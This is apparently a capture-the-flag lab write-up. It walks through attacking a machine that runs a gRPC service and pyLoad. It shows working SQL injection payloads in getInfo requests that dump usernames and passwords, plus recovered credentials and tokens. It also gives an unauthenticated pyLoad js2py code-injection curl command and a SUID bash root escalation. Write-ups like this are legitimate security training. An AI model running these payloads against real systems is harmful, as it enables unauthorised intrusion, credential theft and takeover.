```
Host is up (0.053s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
```

## Recon


If we connect with nc we can see that response has problem with handshake and i investigate for it..
I also check with firefox and something in unicode appears as output.

Googling 50051 port i say sure it's a gRPC so we can dump the calls with `--describe` mode which show the usage of single class of REMOTE PROCEDURE CALL.

in Github there's basically 3 cool clients that help for the job! 
 
1) [grpc-curl]("https://github.com/xoofx/grpc-curl")
2) [grpcurl]("https://github.com/fullstorydev/grpcurl")
3) [grpcui]("https://github.com/fullstorydev/grpcui") The UI interface client edition :D



### The nice function

```
grpc-curl http://10.129.93.207:50051  --describe SimpleApp                                                                                                                           1 ⨯
// SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}

```

Nice so we can basically Login // Register // and to get //getInfo


```
grpcurl -plaintext -d '{"username":"code","password":"code"}' 10.129.93.207:50051 SimpleApp.RegisterUser
```

response:

```json
{
  "message": "Account created for user code!"
}
```

Now we can login with LoginUser function .. what is interesting here and that we have a responde with an id=rand_int e un token .




```http
POST /invoke/SimpleApp.LoginUser HTTP/1.1
Host: 127.0.0.1:38235
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:38235/
Content-Type: application/json
x-grpcui-csrf-token: y5KZMUVj-13lW4Mmy-br_S4jjz9N7Qr43ESkLs5o5ww
X-Requested-With: XMLHttpRequest
Content-Length: 62
Origin: http://127.0.0.1:38235
Connection: close
Cookie: _grpcui_csrf_token=y5KZMUVj-13lW4Mmy-br_S4jjz9N7Qr43ESkLs5o5ww
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
DNT: 1
Sec-GPC: 1

{"metadata":[],"data":[{"username":"code","password":"code"}]}
```

response:

```html
HTTP/1.1 200 OK
Content-Type: application/json
Date: Tue, 23 May 2023 14:16:10 GMT
Content-Length: 586
Connection: close

{
  "headers": [
    {
      "name": "content-type",
      "value": "application/grpc"
    },
    {
      "name": "grpc-accept-encoding",
      "value": "identity, deflate, gzip"
    }
  ],
  "error": null,
  "responses": [
    {
      "message": {
        "message": "Your id is 740."
      },
      "isError": false
    }
  ],
  "requests": {
    "total": 1,
    "sent": 1
  },
  "trailers": [
    {
      "name": "token",
      "value": "b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY29kZSIsImV4cCI6MTY4NDg2MTEyNH0.jZ1skXLcxEXP5oZhYLHGBl7T3OwFsrVBm2IHdvU_igw'"
    }
  ]
}

```

so now we can call getInfo with the provided id and token header



### Q&A 

id = is vulnerbale to sql injection!?? or is it a strange deserialization? 



let's try with sql injection! 


```html
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:33537
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:33537/
Content-Type: application/json
x-grpcui-csrf-token: y5KZMUVj-13lW4Mmy-br_S4jjz9N7Qr43ESkLs5o5ww
X-Requested-With: XMLHttpRequest
Content-Length: 223
Origin: http://127.0.0.1:33537
Connection: close
Cookie: _grpcui_csrf_token=y5KZMUVj-13lW4Mmy-br_S4jjz9N7Qr43ESkLs5o5ww
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
DNT: 1
Sec-GPC: 1

{"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY29kZSIsImV4cCI6MTY4NDg2MTQwN30.voWz_2Pf3DfYLnHhLyieZ9rAYVmGK7APBrvMEfcln8U"}],"data":[{"id":"404 Union select sqlite_version();"}]}
```

it works so we know that we are talking with sqlite v 3.31.1


```html
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:33537
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:33537/
Content-Type: application/json
x-grpcui-csrf-token: y5KZMUVj-13lW4Mmy-br_S4jjz9N7Qr43ESkLs5o5ww
X-Requested-With: XMLHttpRequest
Content-Length: 273
Origin: http://127.0.0.1:33537
Connection: close
Cookie: _grpcui_csrf_token=y5KZMUVj-13lW4Mmy-br_S4jjz9N7Qr43ESkLs5o5ww
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
DNT: 1
Sec-GPC: 1

{"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY29kZSIsImV4cCI6MTY4NDg2MTQwN30.voWz_2Pf3DfYLnHhLyieZ9rAYVmGK7APBrvMEfcln8U"}],"data":[{"id":"404 union SELECT group_concat(username || \",\" || password || \":\") from accounts;"}]}
```



response


```json
{
  "headers": [
    {
      "name": "content-type",
      "value": "application/grpc"
    },
    {
      "name": "grpc-accept-encoding",
      "value": "identity, deflate, gzip"
    }
  ],
  "error": null,
  "responses": [
    {
      "message": {
        "message": "admin,admin:,sau,HereIsYourPassWord1431:"
      },
      "isError": false
    }
  ],
  "requests": {
    "total": 1,
    "sent": 1
  },
  "trailers": []
}
```


## SSH

SSH works with sau : pass


## Privesc 


Found a service in 8000 port hosted by python engine:



so I decided to chisel and try to understand better what's the mechanism of that thing!


with the BIG help of nmap found the version and the possible flows that can lead of some critical stuff.

```
Host is up (0.00036s latency).

PORT     STATE SERVICE VERSION
8000/tcp open  http    CherryPy wsgiserver
|_http-server-header: Cheroot/8.6.0
|_http-favicon: Unknown favicon MD5: 71AAC1BA3CF57C009DA1994F94A2CC89
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http%3A%2F%2Flocalhost%3A8000%2F
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD



```


According with this [aritcle]("https://vulners.com/huntr/3FD606F7-83E1-4265-B083-2E1889A05E65") we can attack this service unauthenticated. we can inject arbitrary code abusing `js2py` funtionality due the lack of CSRF protection, a victim can be tricked to execute arbitrary python code.


so we can try to import a payload `pyimport os;os.system("touch /tmp/nice_job");f=function f2(){};;&package=xxx&crypted=AAAA&&passwords=aaaa'`

```
curl -X POST 127.0.0.1:8000/flash/addcrypted2 -d 'jk=pyimport%20os;os.system(%22touch%20/tmp/nice_job%22);f=function%20f2()%7B%7D;&package=xxx&crypted=AAAA&&passwords=aaaa'`
```



the nicest thing is to convert bash  in a suid so and boom we are root! 


`/bin/bash -p`